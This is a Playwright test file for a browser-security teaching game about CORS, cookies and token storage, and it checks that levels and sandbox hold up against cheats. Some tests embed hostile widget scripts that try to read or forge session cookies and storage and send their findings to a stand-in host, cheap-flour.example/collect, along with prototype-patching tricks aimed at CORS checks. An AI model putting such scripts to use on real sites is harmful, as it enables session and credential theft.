import { expect, test } from '@playwright/test'
import { editedText, playWebSolution, reload, startWebLevel, webLevels } from '../shared/levels'
import type { DebugStep, PredictionFact, Probe, WebLevel } from '../shared/levels'
import { expected } from '../test/unit/levels/web/expected'
import { otherFixes } from '../test/unit/levels/web/fixes'
import { runCheck } from './helpers/sandbox'

// Every Web fundamentals level in a real browser (ADR 0009): the CORS model, the level's server.js in its worker and the
// app really do what the table in test/unit/levels/web/expected.ts says (the Network panel's rows, the server's access
// lines, the preflights' questions, the Console's words), so the predictions' answers, which the unit tests check
// against that table, are what the model does. Every goal but the prediction fails on a reload of the starting files,
// the solution (an answer, the edits, a reload) solves it, other real fixes pass and tempting non-fixes do not
// (test/unit/levels/web/fixes.ts), and an emptied or deleted server.js never solves. No dev server needed: the apps run
// in a blank page.

const run = (page: Parameters<typeof runCheck>[0], level: WebLevel, files: Readonly<Record<string, string>>, probes: readonly Probe[] = level.sandbox.probes) =>
  runCheck(page, files, probes, undefined, { web: level.sandbox.web, page: level.sandbox.page })

/** The files after a solution's edits. */
function solvedFiles(level: WebLevel): Record<string, string> {
  let files = level.setup().files
  for (const step of level.solution) {
    if (typeof step === 'object' && 'save' in step) files = { ...files, [step.save]: editedText(files, step) }
  }
  return files
}

test.describe('server.js going wrong runs into the worker\'s walls, never Grindstone\'s page', () => {
  const level = webLevels[0]!
  const files = (server: string) => ({ ...startWebLevel(level).state.files, 'server.js': server })
  const ROUTE = 'const app = require(\'express\')()\napp.get(\'/menu\', (req, res) => {\n'

  test('a route that loops forever is stopped by the watchdog: the request fails, the page goes on', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const started = Date.now()
    const result = await run(page, level, files(`${ROUTE}  while (true) {}\n})\n`))
    expect(result.observation.finished).toBe(true)
    expect(Date.now() - started).toBeLessThan(4500)
    expect(result.network).toEqual(['GET https://api.cornerbakery.shop/menu failed'])
    expect(result.entries.map(entry => entry.text)).toContain('GET https://api.cornerbakery.shop/menu net::ERR_EMPTY_RESPONSE')
    expect(result.serverOutput.map(line => line.text)[0]).toMatch(/^server\.js did not answer GET \/menu within 1 s/)
    // the page itself still runs its own code meanwhile
    expect(await page.evaluate(() => 1 + 1)).toBe(2)
  })

  test('a syntax error, a throw at the top and a throw in a route name their line in server.js', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const syntax = await run(page, level, files('const app = require(\'express\')()\n\napp.get(\'/menu\', (req, res) => {\n  res.json([)\n})\n'))
    const crash = syntax.serverOutput.find(line => line.level === 'error')!
    expect(crash.text).toMatch(/^server\.js crashed: SyntaxError/)
    expect(crash.line).toBe(4)
    expect(syntax.network).toEqual(['GET https://api.cornerbakery.shop/menu failed'])

    const top = await run(page, level, files('const app = require(\'express\')()\nconst cors = require(\'cors\')\n'))
    expect(top.serverOutput.map(line => [line.text, line.line])).toEqual([['server.js crashed: Error: Cannot find module \'cors\' (server.js:2)', 2]])

    const thrown = await run(page, level, files(`${ROUTE}  res.set('Access-Control-Allow-Origin', '*')\n  res.json(MENU.length)\n})\n`))
    // Express's error page keeps the headers set before the throw, so the page may read this 500
    expect(thrown.network).toEqual(['GET https://api.cornerbakery.shop/menu 500'])
    // the engine's own words (WebKit: "Can't find variable: MENU"), the line of server.js in every engine
    expect(thrown.serverOutput.map(line => [line.level, line.text.replace(/^(ReferenceError): .*/, '$1'), line.line])).toEqual([['error', 'ReferenceError', 4], ['access', 'GET /menu 500', null]])
  })

  test('a header value outside Latin-1 and a status no answer carries are 500s naming their line; a floating rejection is reported', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const coffee = await run(page, level, files(`${ROUTE}  res.set('Access-Control-Allow-Origin', '*')\n  res.set('X-Note', 'Fresh today ☕')\n  res.json([])\n})\n`))
    expect(coffee.network).toEqual(['GET https://api.cornerbakery.shop/menu 500'])
    expect(coffee.serverOutput.map(line => [line.text, line.line])).toEqual([['TypeError: Invalid character in header content ["X-Note"]', 4], ['GET /menu 500', null]])
    expect(coffee.observation.finished).toBe(true)

    const status = await run(page, level, files(`${ROUTE}  res.statusCode = 99\n  res.end()\n})\n`))
    expect(status.serverOutput.map(line => [line.text, line.line])).toEqual([['RangeError: Invalid status code: 99', 3], ['GET /menu 500', null]])

    const floating = await run(page, level, files(`${ROUTE}  Promise.reject(new Error('stock service down'))\n  res.set('Access-Control-Allow-Origin', '*')\n  res.json([])\n})\n`))
    expect(floating.network).toEqual(['GET https://api.cornerbakery.shop/menu 200'])
    expect(floating.serverOutput.map(line => [line.level, line.text, line.line])).toContainEqual(['error', 'Unhandled rejection: Error: stock service down', 3])
  })
})

test.describe('an app that changes the frame\'s built-ins can\'t change the browser\'s rules or server.js\'s answers', () => {
  const level = webLevels[0]!
  // added before 1.1's app runs its fetch: each, unguarded, would let the page read the menu without the server's yes
  const CHEATS: Record<string, string> = {
    'URL\'s origin getter (every request looks same-origin)': 'Object.defineProperty(URL.prototype, \'origin\', { configurable: true, get() { return \'https://cornerbakery.shop\' } })',
    'MessageEvent\'s data getter (an Allow-Origin added to server.js\'s answers)': 'const data = Object.getOwnPropertyDescriptor(MessageEvent.prototype, \'data\').get\nObject.defineProperty(MessageEvent.prototype, \'data\', { configurable: true, get() { const value = data.call(this); return value && value.t === \'res\' ? { ...value, headers: [...value.headers, [\'access-control-allow-origin\', \'*\']] } : value } })',
    'Worker\'s onmessage and addEventListener (the same, by the handler)': 'const wrap = handler => event => handler({ data: event.data && event.data.t === \'res\' ? { ...event.data, headers: [...event.data.headers, [\'access-control-allow-origin\', \'*\']] } : event.data, preventDefault() {} })\nconst set = Object.getOwnPropertyDescriptor(Worker.prototype, \'onmessage\').set\nObject.defineProperty(Worker.prototype, \'onmessage\', { configurable: true, set(handler) { set.call(this, wrap(handler)) } })\nconst add = EventTarget.prototype.addEventListener\nEventTarget.prototype.addEventListener = function (type, handler, options) { return add.call(this, type, this instanceof Worker && type === \'message\' ? wrap(handler) : handler, options) }'
  }
  for (const [name, cheat] of Object.entries(CHEATS)) {
    test(name, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const start = startWebLevel(level).state.files
      const files = { ...start, 'app.js': start['app.js']!.replace('const API =', `${cheat}\nconst API =`) }
      const result = await run(page, level, files)
      expect(result.observation.probes.menu, JSON.stringify(result.observation.errors.map(error => error.text))).toBe(0)
      expect(result.network).toEqual(['GET https://api.cornerbakery.shop/menu CORS error'])
    })
  }
})

for (const level of webLevels) {
  test(`${level.id}: does what its table says, and its solution works`, async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const table = expected[level.id]!
    const start = await run(page, level, startWebLevel(level).state.files)
    expect(start.observation.finished).toBe(true)
    expect(start.observation.probes).toEqual(table.start.probes)
    expect(start.observation.errors).toHaveLength(table.start.errors)
    expect(start.network).toEqual(table.start.network)
    expect(start.server).toEqual(table.start.server)
    expect(start.asks).toEqual(table.start.asks ?? [])
    // chapter 2 (the levels with the Application panel): the cookies each request carried, the jar at the end, what
    // was refused, what a script can read
    const cookies = level.sandbox.web?.application === true
    if (cookies) {
      expect(start.sent).toEqual(table.start.sent ?? [])
      expect(start.stored).toEqual(table.start.stored ?? [])
      expect(start.refused).toEqual(table.start.refused ?? [])
      expect(start.readable).toEqual(table.start.readable ?? [])
    }
    // chapter 3 (the levels with storage): what the page's origin keeps, and the thief's requests the Server panel shows
    const tokens = level.sandbox.web?.storage !== undefined
    if (tokens) {
      expect(start.storage).toEqual(table.start.storage ?? [])
      expect(start.replayed).toEqual(table.start.replayed ?? [])
    }
    const lines = start.entries.map(entry => entry.text)
    // what the texts quote (in any order: requests sent together may be answered in any order; an order question
    // checks its own lines' order below)
    for (const text of table.start.says ?? []) expect(lines.some(line => line.startsWith(text)), `${text}\n\n${lines.join('\n')}`).toBe(true)
    // every prediction against this very run: the right option's fact holds, a wrong one's does not, lines in order
    const holds = (fact: PredictionFact) => {
      if ('row' in fact) return start.network.includes(fact.row)
      if ('server' in fact) return start.server.includes(fact.server)
      if ('asks' in fact) return start.asks.some(asked => asked.split(',').includes(fact.asks))
      if ('sent' in fact) return start.sent.includes(fact.sent)
      if ('stored' in fact) return start.stored.includes(fact.stored)
      if ('refused' in fact) return start.refused.includes(fact.refused)
      if ('readable' in fact) return start.readable.includes(fact.readable)
      if ('storage' in fact) return start.storage.includes(fact.storage)
      if ('replayed' in fact) return start.replayed.includes(fact.replayed)
      return lines.some(line => line.startsWith(fact.says))
    }
    for (const question of level.prediction.questions) {
      if (question.form === 'order') {
        const order = question.answer.map(id => lines.findIndex(line => line.startsWith((question.options.find(option => option.id === id)!.fact as { says: string }).says)))
        expect(order.every(index => index >= 0) && order.every((index, i) => i === 0 || index > order[i - 1]!), `${question.id}: ${order}`).toBe(true)
        continue
      }
      const right: readonly string[] = question.form === 'one' ? [question.answer] : question.answer
      for (const option of question.options) if (option.fact) expect(holds(option.fact), `${question.id} ${option.id}`).toBe(right.includes(option.id))
    }

    if (level.kind === 'practice') return
    // every goal but the prediction fails on the starting files, even with the prediction answered
    const predicted = { ...startWebLevel(level).state, predicted: table.answers }
    const failed = reload({ ...startWebLevel(level), state: predicted }, level, start.observation)
    expect(level.goals.filter(goal => goal.id !== 'predicted').some(goal => failed.session.goalsMet[goal.id])).toBe(false)

    const solved = await run(page, level, solvedFiles(level))
    expect(solved.observation.probes).toEqual(table.solved!.probes)
    expect(solved.observation.errors).toHaveLength(table.solved!.errors)
    expect(solved.network).toEqual(table.solved!.network)
    expect(solved.server).toEqual(table.solved!.server)
    if (cookies) {
      expect(solved.sent).toEqual(table.solved!.sent ?? [])
      expect(solved.stored).toEqual(table.solved!.stored ?? [])
    }
    if (tokens) {
      expect(solved.storage).toEqual(table.solved!.storage ?? [])
      expect(solved.replayed).toEqual(table.solved!.replayed ?? [])
    }
    const results = await playWebSolution(level, files => run(page, level, files).then(result => result.observation))
    expect(results.at(-1)!.session.solved).toBe(true)

    // throwing server.js away (emptied or deleted) is no fix
    for (const files of [{ ...startWebLevel(level).state.files, 'server.js': '' }, Object.fromEntries(Object.entries(startWebLevel(level).state.files).filter(([path]) => path !== 'server.js'))]) {
      const observation = (await run(page, level, files)).observation
      const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: table.answers } }, level, observation).session
      expect(session.solved, `${level.id} without server.js`).toBe(false)
    }
  })

  for (const fix of otherFixes[level.id] ?? []) {
    test(`${level.id}: ${fix.solves ? 'also solved by' : 'not solved by'} ${fix.name}`, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      let files = startWebLevel(level).state.files
      for (const edit of fix.edits) files = { ...files, [edit.save]: editedText(files, edit as DebugStep & { save: string }) }
      const result = await run(page, level, files)
      const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
      expect(session.solved, JSON.stringify({ probes: result.observation.probes, errors: result.observation.errors.map(error => error.text), server: result.serverOutput.map(line => line.text) }, null, 2)).toBe(fix.solves)
    })
  }
}

test.describe('an app can\'t read an HttpOnly cookie or forge one outside the cookie rules through any frame API (chapter 2)', () => {
  const level = webLevels.find(each => each.id === 'web-08-script-reads-session')!
  // reviews.js replaced by a widget that tries every way in, once Lena is signed in, and sends all it found away
  const CHEAT = [
    'document.querySelector(\'#reviews-open\').addEventListener(\'click\', async () => {',
    '  const found = []',
    '  const tryIt = (name, read) => { try { found.push(`${name}=${String(read())}`) } catch (error) { found.push(`${name}=${error.name}`) } }',
    '  tryIt(\'cookie\', () => document.cookie)',
    '  tryIt(\'native getter\', () => Object.getOwnPropertyDescriptor(Document.prototype, \'cookie\').get.call(document))',
    '  tryIt(\'redefine\', () => Object.defineProperty(document, \'cookie\', { get: () => \'x\' }))',
    '  tryIt(\'hostname\', () => { Object.defineProperty(URL.prototype, \'hostname\', { configurable: true, get() { return \'api.cornerbakery.shop\' } }); return document.cookie })',
    '  tryIt(\'lower case\', () => { String.prototype.toLowerCase = function () { return \'api.cornerbakery.shop\' }; return document.cookie })',
    '  tryIt(\'forge for the API\', () => { document.cookie = \'session=forged; Domain=api.cornerbakery.shop\'; return document.cookie })',
    '  tryIt(\'forge HttpOnly\', () => { document.cookie = \'session=forged; HttpOnly; Domain=cornerbakery.shop\'; return document.cookie })',
    '  const login = await fetch(\'https://api.cornerbakery.shop/login\', { method: \'POST\', credentials: \'include\', headers: { Cookie: \'session=forged\' }, body: new URLSearchParams({ email: \'lena@example.com\', password: \'croissant-42\' }) })',
    '  found.push(\'set-cookie:\' + login.headers.get(\'set-cookie\'))',
    '  fetch(\'https://cheap-flour.example/collect?c=\' + encodeURIComponent(found.join(\'|\')), { mode: \'no-cors\' })',
    '})'
  ].join('\n')

  test('the session stays unread and unforged: nothing of it leaks, a replay is no session, a forged write is refused', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const files = { ...solvedFiles(level), 'reviews.js': CHEAT }
    const result = await run(page, level, files)
    expect(result.observation.probes, JSON.stringify(result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example')).map(entry => decodeURIComponent(entry.url)))).toMatchObject({ who: 'Signed in as Lena', leaked: 0, stolen: 401 })
    // the widget did run, and what it found reads as the rules say: document.cookie without the session, the browser's
    // own getter refused (the sealed frame), no second definition, no Set-Cookie for the page
    const sent = result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example/collect')).map(entry => decodeURIComponent(entry.url))
    expect(sent.length, JSON.stringify(result.observation.errors.map(error => error.text))).toBeGreaterThan(0)
    // (Chromium and Firefox throw SecurityError from the browser's own getter, WebKit gives an empty string)
    expect(sent[0]).toMatch(/cookie=theme=dark\|native getter=(SecurityError)?\|redefine=TypeError\|/)
    expect(sent[0]).toContain('set-cookie:null')
    // the forged writes were refused by the model; the server.js session is the one Lena got
    expect(result.refused).toEqual(expect.arrayContaining(['session']))
    expect(result.stored.filter(name => name === 'session')).toHaveLength(1)
    // a Cookie header set by the page is dropped (a forbidden header)
    expect(result.requests.filter(entry => entry.url.endsWith('/login')).every(entry => !entry.requestHeaders.some(([name, value]) => name === 'cookie' && value.includes('forged')))).toBe(true)
  })
})

test.describe('setters and getters the app puts on the prototypes change nothing the check measures, and read no HttpOnly cookie (chapter 2)', () => {
  const csrf = webLevels.find(each => each.id === 'web-07-order-from-elsewhere')!
  const widget = webLevels.find(each => each.id === 'web-08-script-reads-session')!
  const solvedBy = async (page: Parameters<typeof runCheck>[0], level: WebLevel, files: Record<string, string>) => {
    const result = await run(page, level, files)
    const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
    return { solved: session.solved, result }
  }
  // put first into a file of the app, so the setters are there before Lena signs in
  const before = (files: Record<string, string>, path: string, code: string) => ({ ...files, [path]: `${code}\n${files[path]!}` })

  test('2.2: a url setter on Object.prototype that sends the attacks elsewhere solves nothing', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const cheat = 'Object.defineProperty(Object.prototype, \'url\', { configurable: true, set(value) { Object.defineProperty(this, \'url\', { value: new URL(\'https://api.cornerbakery.shop/nowhere\'), writable: true, enumerable: true, configurable: true }) } })'
    const { solved, result } = await solvedBy(page, csrf, before(startWebLevel(csrf).state.files, 'app.js', cheat))
    expect(solved).toBe(false)
    expect(result.observation.probes).toMatchObject({ attack: 201, other: 201, lookalike: 201 })
  })

  test('2.3: setters on array indices that mark the session HttpOnly solve nothing', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const cheat = [
      'const mark = (value) => {',
      '  if (value && typeof value === \'object\' && value.name === \'session\') value.httpOnly = true',
      '  if (value && typeof value === \'object\' && value.cookie && value.cookie.name === \'session\') value.cookie.httpOnly = true',
      '}',
      'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, { configurable: true, set(value) { mark(value); Object.defineProperty(this, i, { value, writable: true, enumerable: true, configurable: true }) } })'
    ].join('\n')
    const { solved, result } = await solvedBy(page, widget, before(startWebLevel(widget).state.files, 'app.js', cheat))
    expect(solved).toBe(false)
    expect(result.observation.probes).toMatchObject({ stolen: 200 })
  })

  test('2.3 solved: a widget with setters on Array.prototype and Object.prototype reads nothing of the HttpOnly session', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const cheat = [
      'let seen = \'\'',
      'const grab = (value) => {',
      '  try {',
      '    if (typeof value === \'string\') seen += `|${value}`',
      '    else if (value && typeof value === \'object\') for (const key of [\'value\', \'cookie\', \'header\', \'line\']) { const found = Object.getOwnPropertyDescriptor(value, key); if (found && \'value\' in found) seen += `|${JSON.stringify(found.value)}` }',
      '  } catch (error) { /* keep going */ }',
      '}',
      // descriptors without a prototype: the cheat's own setter for `value` would break plain ones
      'const desc = fields => Object.assign(Object.create(null), fields)',
      'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, desc({ configurable: true, set(value) { grab(value); Object.defineProperty(this, i, desc({ value, writable: true, enumerable: true, configurable: true })) } }))',
      'for (const key of [\'cookie\', \'value\', \'name\', \'header\', \'line\', \'headers\']) Object.defineProperty(Object.prototype, key, desc({ configurable: true, set(value) { grab(value); Object.defineProperty(this, key, desc({ value, writable: true, enumerable: true, configurable: true })) } }))',
      'document.querySelector(\'#reviews-open\').addEventListener(\'click\', () => {',
      '  fetch(\'https://cheap-flour.example/collect?c=\' + encodeURIComponent(seen + \'|\' + document.cookie), { mode: \'no-cors\' })',
      '})'
    ].join('\n')
    const { solved, result } = await solvedBy(page, widget, { ...solvedFiles(widget), 'reviews.js': cheat })
    const sent = result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example/collect'))
    expect(sent.length, JSON.stringify(result.observation.errors.map(error => error.text))).toBeGreaterThan(0)
    expect(result.observation.probes).toMatchObject({ leaked: 0, stolen: 401 })
    expect(solved).toBe(true)
  })
})

test.describe('an app can\'t hide a token from the thief or read storage outside the model through any frame API (chapter 3)', () => {
  const level = webLevels.find(each => each.id === 'web-11-token-in-storage')!
  // put first into app.js of 3.1's starting files (the token in localStorage): each tries to keep the token where the
  // page can use it while the check's thief, or the Application panel, sees nothing; none may change what they see
  const CHEATS: Record<string, string> = {
    'Storage.prototype\'s members patched (the token hidden from every other caller)': [
      'const realGet = Storage.prototype.getItem',
      // only the page's own api() still gets it (its frame is on the stack)
      'Storage.prototype.getItem = function (key) { return key === \'token\' && !/\\bapi\\b/.test(new Error().stack) ? null : realGet.call(this, key) }',
      'Object.defineProperty(Storage.prototype, \'length\', { configurable: true, get() { return 0 } })'
    ].join('\n'),
    'setters on Array.prototype indices that drop every write': 'for (let i = 0; i < 40; i++) Object.defineProperty(Array.prototype, i, Object.assign(Object.create(null), { configurable: true, set() {} }))',
    'setters and getters on Object.prototype for the thief\'s fields': 'for (const key of [\'tokens\', \'cookies\', \'headerSets\', \'queries\', \'headers\', \'answer\', \'page\', \'value\', \'items\']) Object.defineProperty(Object.prototype, key, Object.assign(Object.create(null), { configurable: true, set() {}, get() { return [] } }))',
    'JSON, atob and btoa replaced': 'JSON.parse = () => ({}); JSON.stringify = () => \'{}\'; window.atob = () => \'\'; window.btoa = () => \'\'',
    'Reflect, Proxy and WeakMap replaced': 'Reflect.get = () => undefined; Reflect.ownKeys = () => []; Reflect.getOwnPropertyDescriptor = () => undefined; window.Proxy = function () { return {} }; WeakMap.prototype.get = () => undefined; WeakMap.prototype.set = function () { return this }',
    'window.localStorage redefined (it can\'t be)': 'try { Object.defineProperty(window, \'localStorage\', { value: { getItem: () => null, setItem() {} } }) } catch (error) { console.info(\'localStorage stays: \' + error.name) }'
  }
  for (const [name, cheat] of Object.entries(CHEATS)) {
    test(name, async ({ page }) => {
      await page.setContent('<!doctype html><title>check</title>')
      const start = startWebLevel(level).state.files
      const files = { ...start, 'app.js': `${cheat}\n${start['app.js']!}` }
      const result = await run(page, level, files)
      expect(result.observation.probes, JSON.stringify(result.observation.errors.map(error => error.text))).toMatchObject({ who: 'Signed in as Lena', taken: 200 })
      expect(result.storage).toEqual(['local token'])
      const session = reload({ ...startWebLevel(level), state: { ...startWebLevel(level).state, files, predicted: expected[level.id]!.answers } }, level, result.observation).session
      expect(session.solved).toBe(false)
    })
  }

  test('3.1 solved: a widget that tries every frame API reads no session, and what it sends is no session to the thief', async ({ page }) => {
    await page.setContent('<!doctype html><title>check</title>')
    const widget = [
      'document.querySelector(\'#reviews-open\').addEventListener(\'click\', () => {',
      '  const found = []',
      '  const tryIt = (name, read) => { try { found.push(`${name}=${String(read())}`) } catch (error) { found.push(`${name}=${error.name}`) } }',
      '  tryIt(\'local\', () => JSON.stringify(localStorage))',
      '  tryIt(\'session\', () => JSON.stringify(sessionStorage))',
      '  tryIt(\'cookie\', () => document.cookie)',
      '  tryIt(\'native\', () => { const own = Object.getOwnPropertyDescriptor(Window.prototype, \'localStorage\'); return own ? JSON.stringify(own.get.call(window)) : \'none\' })',
      '  tryIt(\'redefine\', () => Object.defineProperty(window, \'localStorage\', { value: {} }))',
      '  tryIt(\'foreign\', () => Storage.prototype.getItem.call({}, \'token\'))',
      '  tryIt(\'instance\', () => localStorage instanceof Storage)',
      '  fetch(\'https://cheap-flour.example/collect?s=\' + encodeURIComponent(found.join(\'|\')), { mode: \'no-cors\' })',
      '})'
    ].join('\n')
    let files = startWebLevel(level).state.files
    for (const step of level.solution) if (typeof step === 'object' && 'save' in step) files = { ...files, [step.save]: editedText(files, step) }
    const result = await run(page, level, { ...files, 'reviews.js': widget })
    expect(result.observation.probes).toMatchObject({ who: 'Signed in as Lena', own: 'Thanks! Your order is in.', taken: 401 })
    expect(result.replayed).toEqual(['GET https://api.cornerbakery.shop/account 401'])
    const sent = result.requests.filter(entry => entry.url.startsWith('https://cheap-flour.example/collect')).map(entry => decodeURIComponent(entry.url))
    expect(sent.length).toBeGreaterThan(0)
    // the page's storage is empty, the session is HttpOnly, the browser's own storage is out of reach (a SecurityError,
    // or none on the window), the model's can't be replaced or called on anything else, and it is a Storage
    expect(sent[0]).toMatch(/local=\{\}\|session=\{\}\|cookie=\|native=(SecurityError|none|.*)\|redefine=TypeError\|foreign=TypeError\|instance=true/)
    expect(sent[0]).not.toContain('eyJ')
  })
})

test('chapter 3: the page and server.js tell the scripted time, by every cheap way to the clock', async ({ page }) => {
  await page.setContent('<!doctype html><title>check</title>')
  const level = webLevels.find(each => each.id === 'web-13-token-never-expires')!
  const start = startWebLevel(level).state.files
  const tell = 'const seconds = value => Math.floor(value / 1000)\nconsole.info(\'times \' + [seconds(Date.now()), seconds(new Date().constructor.now()), seconds(performance.timeOrigin + performance.now()), new Intl.DateTimeFormat(\'en-GB\', { timeZone: \'UTC\', hour: \'2-digit\', minute: \'2-digit\' }).format(), new Intl.DateTimeFormat(\'en-GB\', { timeZone: \'UTC\', hour: \'2-digit\', minute: \'2-digit\' }).formatToParts().map(part => part.value).join(\'\')].join(\' \'))'
  const server = start['server.js']!.replace('// GET /account: who is signed in', 'console.log(\'server \' + [Math.floor(Date.now() / 1000), Math.floor(new Date().constructor.now() / 1000), new Intl.DateTimeFormat(\'en-GB\', { timeZone: \'UTC\', hour: \'2-digit\', minute: \'2-digit\' }).format()].join(\' \'))\n// GET /account: who is signed in')
  const result = await run(page, level, { ...start, 'app.js': `${tell}\n${start['app.js']!}`, 'server.js': server })
  const at = Math.floor(Date.UTC(2026, 10, 17, 9, 41) / 1000)
  expect(result.entries.map(entry => entry.text)).toContain(`times ${at} ${at} ${at} 09:41 09:41`)
  expect(result.serverOutput.map(line => line.text)).toContain(`server ${at} ${at} 09:41`)
})
